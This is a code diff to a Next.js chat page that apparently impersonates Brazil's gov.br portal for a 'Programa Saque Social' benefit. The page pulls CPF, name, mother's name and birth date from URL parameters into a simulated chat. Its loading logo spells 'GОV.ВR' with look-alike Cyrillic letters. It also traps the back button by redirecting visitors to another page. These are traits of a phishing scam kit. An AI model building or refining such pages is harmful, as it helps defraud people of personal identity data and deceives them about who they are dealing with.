@@ -4,17 +4,17 @@
 import React, { useState, useEffect, Suspense, useRef } from 'react';
 import Head from 'next/head';
 import Image from 'next/image';
-import Script from 'next/script'; // Import next/script
 import { useSearchParams, useRouter } from 'next/navigation';
 import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
+import SimulatedChatFlow, { type SimulatedChatParams } from '@/components/features/SimulatedChatFlow';
 import '../chat-page.css';
 
 function ChatPageContent() {
   const router = useRouter();
   const searchParams = useSearchParams();
   const [headerUserName, setHeaderUserName] = useState('Usuário');
-  const typebotInitializedRef = useRef(false);
-  const [isLocalTypebotScriptLoaded, setIsLocalTypebotScriptLoaded] = useState(false);
+
+  const [chatParams, setChatParams] = useState<SimulatedChatParams>({});
 
   useEffect(() => {
     const urlBackRedirect = '/back/index.html';
@@ -24,7 +24,7 @@ function ChatPageContent() {
     if (window.history.state?.pageInitialized !== true) {
       history.pushState({ pageInitialized: true }, "", window.location.href);
     }
-    
+
     const handlePopState = () => {
       setTimeout(() => {
         window.location.href = trimmedUrlBackRedirect;
@@ -37,80 +37,40 @@ function ChatPageContent() {
       setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
     }
 
+    // Prepare params for SimulatedChatFlow
+    const params: SimulatedChatParams = {};
+    const gclid = searchParams.get('gclid');
+    const utm_source = searchParams.get('utm_source');
+    const utm_campaign = searchParams.get('utm_campaign');
+    const utm_medium = searchParams.get('utm_medium');
+    const utm_content = searchParams.get('utm_content');
+    const cpf = searchParams.get('cpf');
+    const nome = searchParams.get('nome');
+    const mae = searchParams.get('mae');
+    const nascimento = searchParams.get('nascimento');
+
+    if (gclid) params.gclid = gclid;
+    if (utm_source) params.utm_source = utm_source;
+    if (utm_campaign) params.utm_campaign = utm_campaign;
+    if (utm_medium) params.utm_medium = utm_medium;
+    if (utm_content) params.utm_content = utm_content;
+    if (cpf) params.cpf = cpf;
+    if (nome) params.nome = nome;
+    if (mae) params.mae = mae;
+    if (nascimento) params.nascimento = nascimento;
+    setChatParams(params);
+
+
     return () => {
       window.removeEventListener('popstate', handlePopState);
     };
-  }, []); // Runs once on mount
-
-  useEffect(() => {
-    if (isLocalTypebotScriptLoaded) {
-      if (typebotInitializedRef.current) {
-        console.log('Typebot initialization already attempted/completed.');
-        return;
-      }
-
-      const typebotElement = document.querySelector('typebot-standard');
-      if (!typebotElement) {
-        console.error('Typebot standard element not found in DOM. Initialization aborted.');
-        return;
-      }
-
-      if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
-        console.log('Typebot appears to be already initialized in the DOM.');
-        typebotInitializedRef.current = true;
-        return;
-      }
-      
-      console.log('Local Typebot script loaded. Attempting to initialize Typebot...');
-      
-      if (window.Typebot && typeof window.Typebot.initStandard === 'function') {
-        const typebotIdFromQuery = searchParams.get('typebotId');
-        const apiHostFromQuery = searchParams.get('apiHost');
-
-        const typebotToUse = typebotIdFromQuery || "24lkdef";
-        const apiHostToUse = apiHostFromQuery || "https://chat.bestbot.info";
-
-        console.log(`Initializing Typebot with ID: ${typebotToUse} and API Host: ${apiHostToUse}`);
-
-        try {
-          window.Typebot.initStandard({
-            typebot: typebotToUse, 
-            apiHost: apiHostToUse,
-          });
-          typebotInitializedRef.current = true; 
-          console.log('Typebot.initStandard called successfully using window.Typebot.');
-        } catch (e) {
-          console.error('Error during Typebot.initStandard call (window.Typebot):', e);
-        }
-      } else {
-        console.error(
-          'window.Typebot or window.Typebot.initStandard is not available, even after local script reported loaded. ' +
-          'This usually means the script at "/js/typebot-web.js" was loaded but did not correctly assign its Typebot object to "window.Typebot". ' +
-          'Please ensure your local script (public/js/typebot-web.js) explicitly sets "window.Typebot = YourTypebotObject;" at the end of the file.'
-        );
-      }
-    }
-  }, [isLocalTypebotScriptLoaded, searchParams]);
-
+  }, [searchParams]); // Ensure it re-runs if searchParams change, though unlikely in this setup after initial load.
 
   return (
     <>
       <Head>
         <title>Programa Saque Social - Atendimento</title>
-        {/* Script tag for local Typebot will be added via next/script */}
       </Head>
-      
-      <Script
-        src="/js/typebot-web.js" // Path to your local Typebot script
-        strategy="afterInteractive" // Load after the page is interactive
-        onLoad={() => {
-          console.log('Local Typebot script (/js/typebot-web.js) has loaded.');
-          setIsLocalTypebotScriptLoaded(true);
-        }}
-        onError={(e) => {
-          console.error('Error loading local Typebot script (/js/typebot-web.js):', e);
-        }}
-      />
 
       <div className="chat-page-body">
         <header className="chat-page-header">
@@ -142,17 +102,18 @@ function ChatPageContent() {
         </nav>
 
         <div className="typebot-container-wrapper">
-            <div className="typebot-embed-container">
-                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
-            </div>
+          <div className="typebot-embed-container">
+            {/* Render the simulated chat flow here */}
+            <SimulatedChatFlow initialParams={chatParams} />
+          </div>
         </div>
-        
+
         <footer className="chat-page-footer">
-          <Image 
+          <Image
             src="https://i.imgur.com/919uhHG.png"
-            alt="Rodapé Logo" 
-            width={150} 
-            height={40} 
+            alt="Rodapé Logo"
+            width={150}
+            height={40}
             className="footer-logo"
             data-ai-hint="company logo"
             priority={false}
@@ -166,14 +127,14 @@ function ChatPageContent() {
 export default function ChatPage() {
   return (
     <Suspense fallback={
-      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
-        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
-          <title>GОV.ВR</title> 
-          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
-            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
-            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
-          </text> 
-        </svg> 
+      <div id="loading-screen" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff' }}>
+        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
+          <title>GОV.ВR</title>
+          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
+            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
+            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
+          </text>
+        </svg>
       </div>
     }>
       <ChatPageContent />
